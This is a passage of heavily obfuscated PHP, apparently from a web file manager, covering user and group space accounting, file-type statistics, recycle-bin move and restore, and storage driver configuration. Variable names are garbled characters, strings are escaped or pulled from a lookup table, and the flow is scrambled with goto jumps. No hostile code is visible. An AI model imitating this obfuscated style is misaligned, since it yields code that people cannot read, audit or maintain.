$C´—“õ¥Äø[501])); $F†ôğŸÇÒñ = $C´—“õ¥Äø[1933]; $bÚößÌÎ¼ª = $this->field($F†ôğŸÇÒñ)->where($eæ·¥ï¨Œ)->select(); goto dµ»ßÜ±‡; BÕ†°…¬Ù: } public function userSpaceReset($A©Û‡ë•§Ê = false) { $eï‡µ˜½Š =& $_SERVER[úÎü]; $bËÛöŠÃ—¿ = $this->where(array($eï‡µ˜½Š[387] => self::TYPE_USER, $eï‡µ˜½Š[473] => $A©Û‡ë•§Ê, $eï‡µ˜½Š[386] => 0))->sum($eï‡µ˜½Š[77]); Model($eï‡µ˜½Š[491])->userEdit($A©Û‡ë•§Ê, array($eï‡µ˜½Š[1630] => $bËÛöŠÃ—¿)); } public function targetSpaceUpdate($F¶Ö°ò¶†, $B¨¿¤«Ğ¦æ) { $c ‡ˆ÷İŒ =& $_SERVER[úÎü]; if (!$B¨¿¤«Ğ¦æ) { return; } if (!in_array($F¶Ö°ò¶†, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $F±Ğ¨Ã£ß = $this->targetSpaceSize($F¶Ö°ò¶†, $B¨¿¤«Ğ¦æ); if ($F¶Ö°ò¶† == self::TYPE_USER) { Model($c ‡ˆ÷İŒ[491])->userEdit($B¨¿¤«Ğ¦æ, array($c ‡ˆ÷İŒ[1630] => $F±Ğ¨Ã£ß)); } else { if ($F¶Ö°ò¶† == self::TYPE_GROUP) { Model($c ‡ˆ÷İŒ[475])->groupEdit($B¨¿¤«Ğ¦æ, array($c ‡ˆ÷İŒ[1630] => $F±Ğ¨Ã£ß)); } } } public function targetSpaceSize($F¡£„†›, $A°„æÄ¤Ï´) { goto EÃ—µ‰‰©æ; A¡‚é°ÒºÃ: $AáŸÚ¨Ü’Ú = array_to_keyvalue($AáŸÚ¨Ü’Ú, $E‹ÄÛùØà[33], $E‹ÄÛùØà[385]); $AáŸÚ¨Ü’Ú = array_unique(array_filter($AáŸÚ¨Ü’Ú)); if ($AáŸÚ¨Ü’Ú) { $C·£•óĞ = array($E‹ÄÛùØà[399] => array($E‹ÄÛùØà[400], $AáŸÚ¨Ü’Ú)); $B„¯à×¬„ += floatval($this->where($C·£•óĞ)->sum($E‹ÄÛùØà[77])); } goto E¥äö„™å; E¥äö„™å: return $B„¯à×¬„; goto CÂ ù„ºø‘; cñÅÉãÇíŠ: $B„¯à×¬„ = floatval($Cà‰ŸÀ¦ì×[$E‹ÄÛùØà[77]]); $C·£•óĞ = array($E‹ÄÛùØà[542] => array($E‹ÄÛùØà[500], $E‹ÄÛùØà[487] . $Cà‰ŸÀ¦ì×[$E‹ÄÛùØà[385]] . $E‹ÄÛùØà[501])); $AáŸÚ¨Ü’Ú = Model($E‹ÄÛùØà[411])->field($E‹ÄÛùØà[399])->where($C·£•óĞ)->select(); goto A¡‚é°ÒºÃ; EÃ—µ‰‰©æ: $E‹ÄÛùØà =& $_SERVER[úÎü]; $Cà‰ŸÀ¦ì× = $this->sourceRoot($F¡£„†›, $A°„æÄ¤Ï´, !0); if (!$Cà‰ŸÀ¦ì×) { return 0; } goto cñÅÉãÇíŠ; CÂ ù„ºø‘: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($dİ‰ï“µË) { return $this->fileTypeProfile($dİ‰ï“µË, SourceModel::TYPE_USER); } public function groupFileTypeProfile($cˆ„…Š‰»“) { return $this->fileTypeProfile($cˆ„…Š‰»“, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Cµäñ‘àù„, $A×©œ¯Ùˆš) { goto dÚ†é—¹ÁÔ; d­¿Íœá¯: $bËÒÓ‚Ó†Š = array(); $bËÒÓ‚Ó†Š[$FÉñÌ±Ğñ[1936]] = array($FÉñÌ±Ğñ[1937] => LNG($FÉñÌ±Ğñ[1936]), $FÉñÌ±Ğñ[1938] => $this->where($A¿—ÑŒ«Šµ)->count(), $FÉñÌ±Ğñ[537] => $this->where($A¿—ÑŒ«Šµ)->sum($FÉñÌ±Ğñ[77])); $eØîŠÏ›¹ó = KodIO::fileTypeList(); goto d´¬í•ôØ¼; dÚ†é—¹ÁÔ: $FÉñÌ±Ğñ =& $_SERVER[úÎü]; $fÇ„í‘Ù¾ = $FÉñÌ±Ğñ[1935] . $Cµäñ‘àù„ . $FÉñÌ±Ğñ[70] . $A×©œ¯Ùˆš; $fÛùÜ¼ïîğ = Cache::get($fÇ„í‘Ù¾); goto D‚»­¤¿ÈË; d´¬í•ôØ¼: foreach ($eØîŠÏ›¹ó as $FØÖÌàÓä§ => $c‹ğ¹ˆ¿è ) { $A¿—ÑŒ«Šµ[$FÉñÌ±Ğñ[388]] = $this->fileTypeWhere($FØÖÌàÓä§); $bËÒÓ‚Ó†Š[$FØÖÌàÓä§] = array($FÉñÌ±Ğñ[1937] => $c‹ğ¹ˆ¿è [$FÉñÌ±Ğñ[28]], $FÉñÌ±Ğñ[1938] => $this->where($A¿—ÑŒ«Šµ)->count(), $FÉñÌ±Ğñ[537] => $this->where($A¿—ÑŒ«Šµ)->sum($FÉñÌ±Ğñ[77])); } Cache::set($fÇ„í‘Ù¾, $bËÒÓ‚Ó†Š, 1200); return $bËÒÓ‚Ó†Š; goto B°àŒ¨ä­©; D‚»­¤¿ÈË: if ($fÛùÜ¼ïîğ) { return $fÛùÜ¼ïîğ; } $A¿—ÑŒ«Šµ = array($FÉñÌ±Ğñ[535] => 0); if ($Cµäñ‘àù„ != !1) { $A¿—ÑŒ«Šµ[$FÉñÌ±Ğñ[473]] = $Cµäñ‘àù„; $A¿—ÑŒ«Šµ[$FÉñÌ±Ğñ[387]] = $A×©œ¯Ùˆš; } goto d­¿Íœá¯; B°àŒ¨ä­©: } public function fileNameExist($f‚ë„Ü¡Ã¬, $F‘ó ¸¸ö) { $C¶‚•ÍÍˆ =& $_SERVER[úÎü]; $dÄá·‚ê¬ò = $this->childList($f‚ë„Ü¡Ã¬); foreach ($dÄá·‚ê¬ò as $CçŞÔ½¥ËÓ) { if ($CçŞÔ½¥ËÓ[$C¶‚•ÍÍˆ[28]] == $F‘ó ¸¸ö) { return $CçŞÔ½¥ËÓ[$C¶‚•ÍÍˆ[385]]; } if (strtolower($CçŞÔ½¥ËÓ[$C¶‚•ÍÍˆ[28]]) == strtolower($F‘ó ¸¸ö)) { return $CçŞÔ½¥ËÓ[$C¶‚•ÍÍˆ[385]]; } } return !1; } public function childList($DÉ‚‰Óõó) { goto d‘òŞ„‘ã³; cÛî¶Ğ•¨: $D¾£İŞÆ¯ = array($D¬ˆÏéŠÜæ[478] => intval($DÉ‚‰Óõó), $D¬ˆÏéŠÜæ[413] => 0); $f¬ÕÏÇœëŸ = $this->where($D¾£İŞÆ¯)->select(); $f¬ÕÏÇœëŸ = $f¬ÕÏÇœëŸ ? $f¬ÕÏÇœëŸ : array(); goto aÖ¥¹Æë¿Ü; aÖ¥¹Æë¿Ü: self::$cacheChildList[$F—øğçö´Ì] = $f¬ÕÏÇœëŸ; foreach ($f¬ÕÏÇœëŸ as $AµšéåĞ‹„) { $F—øğçö´Ì = $D¬ˆÏéŠÜæ[426] . $AµšéåĞ‹„[$D¬ˆÏéŠÜæ[385]]; self::$cacheSourceInfo[$F—øğçö´Ì] = $AµšéåĞ‹„; } return $f¬ÕÏÇœëŸ; goto FÇ¥Æ¶—º‰; d‘òŞ„‘ã³: $D¬ˆÏéŠÜæ =& $_SERVER[úÎü]; $F—øğçö´Ì = $D¬ˆÏéŠÜæ[1915] . $DÉ‚‰Óõó; if (isset(self::$cacheChildList[$F—øğçö´Ì])) { return self::$cacheChildList[$F—øğçö´Ì]; } goto cÛî¶Ğ•¨; FÇ¥Æ¶—º‰: } public function fileNameAuto($D±¿Œ“äÊÂ, $E™ÙÜ•‡ø², $aĞñ±íò‘¥ = REPEAT_RENAME, $c¡¡“­ç¦‹ = false) { $e‘âÜ“‰‹Ë =& $_SERVER[úÎü]; $DÕÙ¬õ†È = $this->childList($D±¿Œ“äÊÂ); $aÜŠö––ø† = array_to_keyvalue($DÕÙ¬õ†È, $e‘âÜ“‰‹Ë[33], $e‘âÜ“‰‹Ë[28]); return $this->fileNameAutoGet($aÜŠö––ø†, $E™ÙÜ•‡ø², $aĞñ±íò‘¥, $c¡¡“­ç¦‹); } public function fileNameAutoGet($A‹ˆíÜƒäÃ, $AÊÚ¡»šïé, $BêÓ‘ñ³è¥, $D§‚äæãò) { $bôæ˜ÒÇ¹© =& $_SERVER[úÎü]; if ($BêÓ‘ñ³è¥ == REPEAT_REPLACE || !$A‹ˆíÜƒäÃ || !in_array_not_case($AÊÚ¡»šïé, $A‹ˆíÜƒäÃ) || $D§‚äæãò && $BêÓ‘ñ³è¥ != REPEAT_RENAME_FOLDER) { return $AÊÚ¡»šïé; } if ($BêÓ‘ñ³è¥ == REPEAT_SKIP) { return !1; } $e¼áï“±Ğå = $bôæ˜ÒÇ¹©[91] . get_path_ext($AÊÚ¡»šïé); $e¼áï“±Ğå = $e¼áï“±Ğå == $bôæ˜ÒÇ¹©[91] || $D§‚äæãò ? $bôæ˜ÒÇ¹©[33] : $e¼áï“±Ğå; for ($C§ë±ËğµÍ = 1; $C§ë±ËğµÍ <= count($A‹ˆíÜƒäÃ) + 1; $C§ë±ËğµÍ++) { $E‡èÓˆ”± = substr($AÊÚ¡»šïé, 0, strlen($AÊÚ¡»šïé) - strlen($e¼áï“±Ğå)); $CİŒÏ¸ÆÉ = $E‡èÓˆ”± . "\x28{$C§ë±ËğµÍ}\51{$e¼áï“±Ğå}"; if (!in_array_not_case($CİŒÏ¸ÆÉ, $A‹ˆíÜƒäÃ)) { return $CİŒÏ¸ÆÉ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65\x5f\x72\145\143\x79\143\154\145"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\151\x6d\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($DÅÏ¾„íá‘ = false) { $a„Ê¡‡­Ç =& $_SERVER[úÎü]; $DÅÏ¾„íá‘ = $DÅÏ¾„íá‘ ? $DÅÏ¾„íá‘ : USER_ID; $C‘ËÃå¾ĞÜ = $this->where(array($a„Ê¡‡­Ç[1477] => $DÅÏ¾„íá‘))->select(); return array_to_keyvalue($C‘ËÃå¾ĞÜ, $a„Ê¡‡­Ç[33], $a„Ê¡‡­Ç[385]); } public function moveToRecycle($d¤»¨ËˆÇ) { goto EÁ¼­¿¦â…; EÁ¼­¿¦â…: $Dø£ƒ°à´Ì =& $_SERVER[úÎü]; $B—ôõŒ°…… = Model($Dø£ƒ°à´Ì[1162]); $AŞ½èÏÅ½á = $B—ôõŒ°……->sourceInfo($d¤»¨ËˆÇ); goto e˜‰Á«Â¹à; A“ËÉ»¾‚‰: $this->recycleMove($d¤»¨ËˆÇ, 1); if ($AŞ½èÏÅ½á[$Dø£ƒ°à´Ì[386]] == $Dø£ƒ°à´Ì[83]) { $aÒÉ¯¹×–ª = array($Dø£ƒ°à´Ì[542] => array($Dø£ƒ°à´Ì[500], $AŞ½èÏÅ½á[$Dø£ƒ°à´Ì[476]] . $d¤»¨ËˆÇ . $Dø£ƒ°à´Ì[501])); $B—ôõŒ°……->where($aÒÉ¯¹×–ª)->setField($Dø£ƒ°à´Ì[413], 1); } goto f†Çµ¯Ï¦„; e˜‰Á«Â¹à: if (!$AŞ½èÏÅ½á || $AŞ½èÏÅ½á[$Dø£ƒ°à´Ì[413]] == $Dø£ƒ°à´Ì[83]) { return; } $b“¨¡šÃ¹Ø = array($Dø£ƒ°à´Ì[399] => $d¤»¨ËˆÇ, $Dø£ƒ°à´Ì[1477] => USER_ID, $Dø£ƒ°à´Ì[538] => $AŞ½èÏÅ½á[$Dø£ƒ°à´Ì[387]], $Dø£ƒ°à´Ì[539] => $AŞ½èÏÅ½á[$Dø£ƒ°à´Ì[473]], $Dø£ƒ°à´Ì[542] => $AŞ½èÏÅ½á[$Dø£ƒ°à´Ì[476]]); $this->add($b“¨¡šÃ¹Ø); goto A“ËÉ»¾‚‰; f†Çµ¯Ï¦„: } public function clear() { $this->remove(!1); } public function remove($d´•öï„Š¿ = false) { goto a©Ì²à–æ‡; a©Ì²à–æ‡: $CĞÎƒ±¦öï =& $_SERVER[úÎü]; $fÙ¨œ±ä‚ƒ = Model($CĞÎƒ±¦öï[1162]); $e•Î·Í—‘ = $this->listData(); goto EŠ¬¼‚‹¹; EŠ¬¼‚‹¹: $d´•öï„Š¿ = $d´•öï„Š¿ === !1 ? !1 : $d´•öï„Š¿; $EÜëğÏ„ƒ = array(); foreach ($e•Î·Í—‘ as $fì„Œ…»˜) { if ($d´•öï„Š¿ != !1 && !in_array($fì„Œ…»˜, $d´•öï„Š¿)) { continue; } $b¶”·†ÕÖğ = $fÙ¨œ±ä‚ƒ->sourceInfo($fì„Œ…»˜); $fÙ¨œ±ä‚ƒ->remove($fì„Œ…»˜, !1); $f”©¡›Œ—‹ = $b¶”·†ÕÖğ[$CĞÎƒ±¦öï[387]] . $CĞÎƒ±¦öï[70] . $b¶”·†ÕÖğ[$CĞÎƒ±¦öï[473]]; $EÜëğÏ„ƒ[$f”©¡›Œ—‹] = array($CĞÎƒ±¦öï[538] => $b¶”·†ÕÖğ[$CĞÎƒ±¦öï[387]], $CĞÎƒ±¦öï[473] => $b¶”·†ÕÖğ[$CĞÎƒ±¦öï[473]]); $this->where(array($CĞÎƒ±¦öï[385] => $fì„Œ…»˜))->delete(); } goto cš²îÌ°“; cš²îÌ°“: foreach ($EÜëğÏ„ƒ as $BæÚí¥ê) { $fÙ¨œ±ä‚ƒ->targetSpaceUpdate($BæÚí¥ê[$CĞÎƒ±¦öï[387]], $BæÚí¥ê[$CĞÎƒ±¦öï[473]]); } goto c¤‘Èç±Ì‹; c¤‘Èç±Ì‹: } public function restore($d…ØÔÏŸ§ = false) { goto FğÕ‰’³ğ; dæğˆŸïµœ: foreach ($dÑğ­ªµæÂ as $Bßë¦àÆÔÉ) { goto fäÔ­ß¢„; a•æî™ğÌŸ: if ($dµŞ¿Œ…¤Ë[$B›Äß¸â•[413]] == $B›Äß¸â•[83]) { continue; } $A˜òßÑÛÔ˜->lockMoveStart($Bßë¦àÆÔÉ); $this->recycleMove($Bßë¦àÆÔÉ, 0); goto b¿¯»ÂÄ¿; fäÔ­ß¢„: if ($d…ØÔÏŸ§ != !1 && !in_array($Bßë¦àÆÔÉ, $d…ØÔÏŸ§)) { continue; } $e•ù„ì×ë‘ = $A˜òßÑÛÔ˜->sourceInfo($Bßë¦àÆÔÉ); $dµŞ¿Œ…¤Ë = $A˜òßÑÛÔ˜->sourceInfo($e•ù„ì×ë‘[$B›Äß¸â•[478]]); goto a•æî™ğÌŸ; fÙğ´˜‡á±: $e¹ÈÌÕÙ[] = $e•ù„ì×ë‘[$B›Äß¸â•[478]]; if ($e•ù„ì×ë‘[$B›Äß¸â•[386]] == $B›Äß¸â•[83]) { $e¹ÈÌÕÙ[] = $Bßë¦àÆÔÉ; } $A˜òßÑÛÔ˜->lockMoveEnd($Bßë¦àÆÔÉ); goto CªĞİ­©Å¼; b¿¯»ÂÄ¿: if ($e•ù„ì×ë‘[$B›Äß¸â•[386]] == $B›Äß¸â•[83]) { $E ÓÕ·§í = array($B›Äß¸â•[542] => array($B›Äß¸â•[500], $e•ù„ì×ë‘[$B›Äß¸â•[476]] . $Bßë¦àÆÔÉ . $B›Äß¸â•[501])); $A˜òßÑÛÔ˜->where($E ÓÕ·§í)->setField($B›Äß¸â•[413], 0); $this->restoreFolderChildren($Bßë¦àÆÔÉ, $dÑğ­ªµæÂ); } $this->where(array($B›Äß¸â•[385] => $Bßë¦àÆÔÉ))->delete(); $A˜òßÑÛÔ˜->folderSizeReset($e•ù„ì×ë‘[$B›Äß¸â•[478]]); goto fÙğ´˜‡á±; CªĞİ­©Å¼: } $A˜òßÑÛÔ˜->updateModifyTime($e¹ÈÌÕÙ); goto a±ãñ‚ß–; BøÒÖÂ‚: $d…ØÔÏŸ§ = $d…ØÔÏŸ§ == !1 ? !1 : $d…ØÔÏŸ§; if (!$dÑğ­ªµæÂ) { return !0; } $e¹ÈÌÕÙ = array(); goto dæğˆŸïµœ; FğÕ‰’³ğ: $B›Äß¸â• =& $_SERVER[úÎü]; $A˜òßÑÛÔ˜ = Model($B›Äß¸â•[1162]); $dÑğ­ªµæÂ = $this->listData(); goto BøÒÖÂ‚; a±ãñ‚ß–: } private function restoreFolderChildren($a“…´±ÒŠ¶, $FÚÊ‹ŞÒ¶®) { goto b¹Ó„Š²ó£; b‡±¤“¦°: foreach ($FÚÊ‹ŞÒ¶® as $F®õ‘Çœê) { if ($F®õ‘Çœê == $a“…´±ÒŠ¶) { continue; } if (!$FÜÉº‚³¬->isParentOf($a“…´±ÒŠ¶, $F®õ‘Çœê)) { continue; } $AÃ×ÌÄå¿Á = $FÜÉº‚³¬->sourceInfo($F®õ‘Çœê); if ($AÃ×ÌÄå¿Á[$Dˆ±“ ´[386]] == $Dˆ±“ ´[83]) { $F÷òÜÕŒ¢[] = array($Dˆ±“ ´[542] => array($Dˆ±“ ´[500], $AÃ×ÌÄå¿Á[$Dˆ±“ ´[476]] . $F®õ‘Çœê . $Dˆ±“ ´[501])); } else { $F÷òÜÕŒ¢[$Dˆ±“ ´[385]][1][] = $F®õ‘Çœê; } } if (!$F÷òÜÕŒ¢[$Dˆ±“ ´[385]][1]) { unset($F÷òÜÕŒ¢[$Dˆ±“ ´[385]]); } if (!$F÷òÜÕŒ¢) { return; } goto bÅÆ±‰¾; bÅÆ±‰¾: $F÷òÜÕŒ¢[$Dˆ±“ ´[385]][1] = array_unique($F÷òÜÕŒ¢[$Dˆ±“ ´[385]][1]); $F÷òÜÕŒ¢[$Dˆ±“ ´[918]] = $Dˆ±“ ´[1733]; $FÜÉº‚³¬->where($F÷òÜÕŒ¢)->setField($Dˆ±“ ´[413], 1); goto cˆÉœ½¾½†; b¹Ó„Š²ó£: $Dˆ±“ ´ =& $_SERVER[úÎü]; $FÜÉº‚³¬ = Model($Dˆ±“ ´[1162]); $F÷òÜÕŒ¢ = array($Dˆ±“ ´[385] => array($Dˆ±“ ´[7], array())); goto b‡±¤“¦°; cˆÉœ½¾½†: } private function recycleMove($cõ¢¼®åÇŠ, $b‚Ğ íŒÉÎ = 1) { $e”–Ä¼ˆ¹õ =& $_SERVER[úÎü]; $A¯Œ÷›ù¹« = Model($e”–Ä¼ˆ¹õ[1162]); $F÷ ¯ïí = Model($e”–Ä¼ˆ¹õ[1939]); $c»’Úƒ¸Í = array($e”–Ä¼ˆ¹õ[385] => $cõ¢¼®åÇŠ); if ($b‚Ğ íŒÉÎ) { $A¯Œ÷›ù¹«->where($c»’Úƒ¸Í)->setField($e”–Ä¼ˆ¹õ[413], 1); $F÷ ¯ïí->eventRecycle($cõ¢¼®åÇŠ, $e”–Ä¼ˆ¹õ[1940]); } else { $b†íÆŠÇá½ = $A¯Œ÷›ù¹«->where($c»’Úƒ¸Í)->find(); $E©¨ôò…† = $b†íÆŠÇá½[$e”–Ä¼ˆ¹õ[386]] == $e”–Ä¼ˆ¹õ[83]; $c†ÈÄ¦†óÊ = $A¯Œ÷›ù¹«->fileNameAuto($b†íÆŠÇá½[$e”–Ä¼ˆ¹õ[478]], $b†íÆŠÇá½[$e”–Ä¼ˆ¹õ[28]], REPEAT_RENAME_FOLDER, $E©¨ôò…†); if ($c†ÈÄ¦†óÊ != $b†íÆŠÇá½[$e”–Ä¼ˆ¹õ[28]]) { $A¯Œ÷›ù¹«->rename($cõ¢¼®åÇŠ, $c†ÈÄ¦†óÊ); } $A¯Œ÷›ù¹«->where($c»’Úƒ¸Í)->setField($e”–Ä¼ˆ¹õ[413], 0); $F÷ ¯ïí->eventRecycle($cõ¢¼®åÇŠ, $e”–Ä¼ˆ¹õ[1941]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x73\164\x6f\x72\x61\x67\x65\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\163\x69\x7a\145\115\141\x78", "\163\x79\163\x74\145\155", "\x64\145\x66\141\165\x6c\x74", "\x64\x72\151\x76\x65\x72", "\x63\x6f\156\146\151\x67"); public function listData($CÜ¨¯Ñí‡Ü = false, $A°ä‘²©­ = "\155\157\x64\x69\146\171\x54\151\155\x65", $B—‡ãï‚±Ğ = false) { goto fµ÷µâÅˆ; AŸ÷ªÁÊß: return $E¿’ø¨–Ë; goto aåÖ¢Šèöì; fµ÷µâÅˆ: $AÍµ›ò—™ß =& $_SERVER[úÎü]; $E¿’ø¨–Ë = parent::listData($CÜ¨¯Ñí‡Ü, $A°ä‘²©­, $B—‡ãï‚±Ğ); if ($CÜ¨¯Ñí‡Ü) { return $E¿’ø¨–Ë; } goto FÂ‚…Ÿ¡³; FÂ‚…Ÿ¡³: foreach ($E¿’ø¨–Ë as $b¥é¢ğ£² => $Fà¾³ù³ °) { unset($E¿’ø¨–Ë[$b¥é¢ğ£²][$AÍµ›ò—™ß[6]]); $E¿’ø¨–Ë[$b¥é¢ğ£²][$AÍµ›ò—™ß[1630]] = 0; } $F·ˆ¼…·ìª = array_to_keyvalue($E¿’ø¨–Ë, $AÍµ›ò—™ß[33], $AÍµ›ò—™ß[383]); $this->_listAppendSize($E¿’ø¨–Ë, $F·ˆ¼…·ìª); goto AŸ÷ªÁÊß; aåÖ¢Šèöì: } public function _listAppendSize(&$dùµœ²ÅÙô, $bÉòÌòÜŠ©) { $d®¤¦ÈÍ›õ =& $_SERVER[úÎü]; if (!$bÉòÌòÜŠ©) { return; } $c²Éš¥Àíé = $d®¤¦ÈÍ›õ[1942] . implode($d®¤¦ÈÍ›õ[47], $bÉòÌòÜŠ©) . $d®¤¦ÈÍ›õ[1943]; $E×œÁåšÕ = Model($d®¤¦ÈÍ›õ[719])->query($c²Éš¥Àíé); $E×œÁåšÕ = array_to_keyvalue($E×œÁåšÕ, $d®¤¦ÈÍ›õ[383], $d®¤¦ÈÍ›õ[77]); foreach ($dùµœ²ÅÙô as $eõÑ¿†‚ => $d©ìêÒ’ñ×) { $dùµœ²ÅÙô[$eõÑ¿†‚][$d®¤¦ÈÍ›õ[1630]] = isset($E×œÁåšÕ[$d©ìêÒ’ñ×[$d®¤¦ÈÍ›õ[383]]]) ? $E×œÁåšÕ[$d©ìêÒ’ñ×[$d®¤¦ÈÍ›õ[383]]] : 0; } } public function getConfig($cåœÊÕ¶È…) { $f«Äˆ†Æ = parent::listData($cåœÊÕ¶È…); return json_decode($f«Äˆ†Æ[$_SERVER[úÎü][6]], !0); } public function update($FÛ†Œµ–ƒ·, $aÃåóøßÚª) { goto c…‚ƒ¦¸òä; c…‚ƒ¦¸òä: $D˜¬ÑÎøâŒ =& $_SERVER[úÎü]; $f‰®´×«ƒî = $aÃåóøßÚª[$D˜¬ÑÎøâŒ[28]]; $dØŸÈÕéÄ = array_to_keyvalue(parent::listData(), $D˜¬ÑÎøâŒ[28]); goto c×¡ôòëçà; AÉ´ëò¿¿: $fÉÄ¢˜¨ğ = parent::update($FÛ†Œµ–ƒ·, $aÃåóøßÚª); if ($fÉÄ¢˜¨ğ && $aÃåóøßÚª[$D˜¬ÑÎøâŒ[34]]) { foreach ($dØŸÈÕéÄ as $F„µî¡Û¢ù) { if ($F„µî¡Û¢ù[$D˜¬ÑÎøâŒ[34]] && $F„µî¡Û¢ù[$D˜¬ÑÎøâŒ[383]] != $FÛ†Œµ–ƒ·) { parent::update($F„µî¡Û¢ù[$D˜¬ÑÎøâŒ[383]], array($D˜¬ÑÎøâŒ[34] => 0)); } } } return $fÉÄ¢˜¨ğ; goto FÉõ’®Ê¢£; c×¡ôòëçà: if (isset($dØŸÈÕéÄ[$f‰®´×«ƒî]) && $dØŸÈÕéÄ[$f‰®´×«ƒî][$D˜¬ÑÎøâŒ[383]] != $FÛ†Œµ–ƒ·) { return !1; } if (isset($aÃåóøßÚª[$D˜¬ÑÎøâŒ[1944]]) && $aÃåóøßÚª[$D˜¬ÑÎøâŒ[1944]] == $D˜¬ÑÎøâŒ[83]) { $this->checkConfig($aÃåóøßÚª); } unset($aÃåóøßÚª[$D˜¬ÑÎøâŒ[1944]]); goto AÉ´ëò¿¿; FÉõ’®Ê¢£: } public function add($E„ì½˜™Å‚) { goto FÀƒ£‹Ì¤Œ; FÀƒ£‹Ì¤Œ: $a×‚‘ˆ¼âÚ =& $_SERVER[úÎü]; $Dƒ¤áÁµ™… = array_to_keyvalue(parent::listData(), $a×‚‘ˆ¼âÚ[28]); if (isset($Dƒ¤áÁµ™…[$E„ì½˜™Å‚[$a×‚‘ˆ¼âÚ[28]]])) { return !1; } goto aÍ™…¹·Í›; aÍ™…¹·Í›: $this->checkConfig($E„ì½˜™Å‚); $A›ˆ¡Íø÷ª = parent::insert($E„ì½˜™Å‚); if ($A›ˆ¡Íø÷ª && $E„ì½˜™Å‚[$a×‚‘ˆ¼âÚ[34]]) { foreach ($Dƒ¤áÁµ™… as $C÷Í‹Ö«) { if ($C÷Í‹Ö«[$a×‚‘ˆ¼âÚ[34]]) { parent::update($C÷Í‹Ö«[$a×‚‘ˆ¼âÚ[383]], array($a×‚‘ˆ¼âÚ[34] => 0)); } } } goto fùè§ÁÉ–«; fùè§ÁÉ–«: return $A›ˆ¡Íø÷ª; goto d»Œã§—˜; d»Œã§—˜: } public function checkConfig(&$E‚ì¥ÒŒĞ) { goto FÁ›Ã‚Œ –; FÁ›Ã‚Œ –: $E£¸„„‘º =& $_SERVER[úÎü]; $BªĞá¹¿ï” = strtolower($E‚ì¥ÒŒĞ[$E£¸„„‘º[90]]); $a¬ì–ÌÈ•‹ = json_decode($E‚ì¥ÒŒĞ[$E£¸„„‘º[6]], !0); goto C´¥³Éª½¼; C´¥³Éª½¼: foreach ($a¬ì–ÌÈ•‹ as $E„ª²¹¶¦ƒ => $Dß´›õÅ˜·) { $a¬ì–ÌÈ•‹[$E„ª²¹¶¦ƒ] = trim($Dß´›õÅ˜·); } $a¬ì–ÌÈ•‹[$E£¸„„‘º[1945]] = rand_string(6); $aŒºâŒ“” = $GLOBALS[$E£¸„„‘º[6]][$E£¸„„‘º[84]][$E£¸„„‘º[753]]; goto cÒÓÛ£çßï; dÍƒÑŠ†“ç: $AŸê‚ÈÚÉ„ = $FÌ‡¶¶à->getPath($F•Å»Ÿæ©Ä . $E£¸„„‘º[1096]); if (!$FÌ‡¶¶à->mkfile($AŸê‚ÈÚÉ„)) { show_json(LNG($E£¸„„‘º[1949]), !1); } $a¬ì–ÌÈ•‹[$E£¸„„‘º[1036]] = $F•Å»Ÿæ©Ä; goto b¾ŒÓŞéÒË; cÒÓÛ£çßï: $bà»×’Ä´ª = isset($aŒºâŒ“”[$BªĞá¹¿ï”]) ? $aŒºâŒ“”[$BªĞá¹¿ï”] : ucfirst($BªĞá¹¿ï”); $E¨İÇØ¢šÎ = $E£¸„„‘º[71] . $bà»×’Ä´ª; if (!$bà»×’Ä´ª || !class_exists($E¨İÇØ¢šÎ)) { write_log(array($E£¸„„‘º[1946], $E‚ì¥ÒŒĞ, get_caller_info()), $E£¸„„‘º[1947]); show_json(LNG($E£¸„„‘º[1948]), !1, $E‚ì¥ÒŒĞ); } goto E‚¨¯åœÊŠ; E‚¨¯åœÊŠ: $FÌ‡¶¶à = new $E¨İÇØ¢šÎ($a¬ì–ÌÈ•‹); if (in_array($BªĞá¹¿ï”, $FÌ‡¶¶à->objectDriver)) { if (!$FÌ‡¶¶à->isBucketCors() && !$FÌ‡¶¶à->setBucketCors()) { $AáÃŸåŒ = LNG($E£¸„„‘º[1949]); $AáÃŸåŒ .= $E£¸„„‘º[1950] . LNG($E£¸„„‘º[1951]); show_json($AáÃŸåŒ, !1); } } $F•Å»Ÿæ©Ä = rtrim($a¬ì–ÌÈ•‹[$E£¸„„‘º[1036]], $E£¸„„‘º[8]) . $E£¸„„‘º[8]; goto dÍƒÑŠ†“ç; b¾ŒÓŞéÒË: $E‚ì¥ÒŒĞ[$E£¸„„‘º[6]] = json_encode($a¬ì–ÌÈ•‹); $E‚ì¥ÒŒĞ[$E£¸„„‘º[90]] = $bà»×’Ä´ª; return !0; goto FùòƒŠÛ×”; FùòƒŠÛ×”: } public function driverListSystem() { $fŠÙÂàä‹à =& $_SERVER[úÎü]; $a¡Ó‚ŠŠ‘¡ = parent::listData(); $D†îï¨†Š‡ = array(); foreach ($a¡Ó‚ŠŠ‘¡ as $B®ŠÎ’‘‘­) { unset($B®ŠÎ’‘‘­[$fŠÙÂàä‹à[190]], $B®ŠÎ’‘‘­[$fŠÙÂàä‹à[107]]); $B®ŠÎ’‘‘­[$fŠÙÂàä‹à[6]] = json_decode($B®ŠÎ’‘‘­[$fŠÙÂàä‹à[6]], !0); $D†îï¨†Š‡[] = $B®ŠÎ’‘‘­; } return $D†îï¨†Š‡; } public function defaultDriver() { $d¥šº—ßç  =& $_SERVER[úÎü]; $a™®½î‚²Û = parent::listData(); $c„óˆè†ˆÊ = array_filter_by_field($a™®½î‚²Û, $d¥šº—ßç [34], 1); $c„óˆè†ˆÊ = $c„óˆè†ˆÊ[0]; if ($c„óˆè†ˆÊ) { $c„óˆè†ˆÊ[$d¥šº—ßç [6]] = json_decode($c„óˆè†ˆÊ[$d¥šº—ßç [6]], !0); } return $c„óˆè†ˆÊ; } public function driverInfo($d¡—Š§‰ù½) { $aø™‡ÛÀ¼ =& $_SERVER[úÎü]; $Dœ‚ß¬Í = array_to_keyvalue(parent::listData(), $aø™‡ÛÀ¼[383]); if (!isset($Dœ‚ß¬Í[$d¡—Š§‰ù½])) { return !1; } $d¤¥¹êÛ©Õ = 